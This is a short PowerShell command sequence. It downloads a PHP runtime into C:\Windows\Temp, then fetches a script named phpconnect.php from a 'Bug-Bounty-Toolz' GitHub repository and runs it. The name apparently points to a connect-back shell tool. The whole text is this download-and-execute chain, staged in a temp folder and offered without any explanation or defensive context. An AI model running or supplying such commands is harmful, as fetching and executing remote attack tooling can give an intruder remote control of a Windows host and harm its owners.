wget https://windows.php.net/downloads/releases/php-8.0.30-nts-Win32-vs16-x86.zip -O C:\\Windows\\Temp\\php.zip
Expand-Archive -Path C:\\Windows\\Temp\\php.zip -DestinationPath C:\\Windows\\Temp\\php
wget https://raw.githubusercontent.com/fuzzlove/Bug-Bounty-Toolz/refs/heads/master/phpconnect.php -O C:\\Windows\\Temp\\php\\phpconnect.php
& "C:\\Windows\\Temp\\php\\php.exe" @('C:\Windows\Temp\php\phpconnect.php')
